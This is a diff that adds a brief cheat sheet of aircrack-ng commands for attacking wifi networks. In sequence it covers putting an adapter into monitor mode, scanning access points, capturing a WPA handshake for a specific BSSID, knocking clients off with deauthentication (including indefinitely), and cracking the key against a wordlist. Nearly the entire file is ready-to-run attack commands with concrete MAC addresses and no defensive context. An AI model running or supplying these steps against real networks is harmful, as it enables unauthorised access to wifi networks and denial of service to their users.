@@ -1,0 +1,38 @@
+To stop network-manager:
+service network-manager stop
+
+To start network-manager:
+service network-manager start
+
+To stop wpa-supplicant:
+airmon-ng check kill
+
+To put wlan1 into monitor mode:
+airmon-ng start wlan1
+
+To list all wifi adapters:
+iwconfig
+
+To put wlan1mon back into managed mode:
+airmon-ng stop wlan1mon
+
+To show all access points and all station:
+airodump-ng wlan1mon
+
+To show only one access point and its connected stations:
+airodump-ng wlan1mon --bssid 1C:5F:2B:E7:77:EA --channel 11
+
+To capture handshake and save it to a file called handshake.cap:
+airodump-ng wlan1mon --bssid 1C:5F:2B:E7:77:EA --channel 11 --write handshake --output-format cap
+
+To disconnect a station briefly in order to capture handshake:
+aireplay-ng --deauth 4  -a 1C:5F:2B:E7:77:EA -c 40:E2:30:CC:1E:8D wlan1mon
+
+To disconnect a station permanently, as long as this attack is running:
+aireplay-ng --deauth 0  -a 1C:5F:2B:E7:77:EA -c 40:E2:30:CC:1E:8D wlan1mon
+
+To verify wifi keys using a handshake file:
+aircrack-ng handshake.cap -w passwords.txt
+
+
+
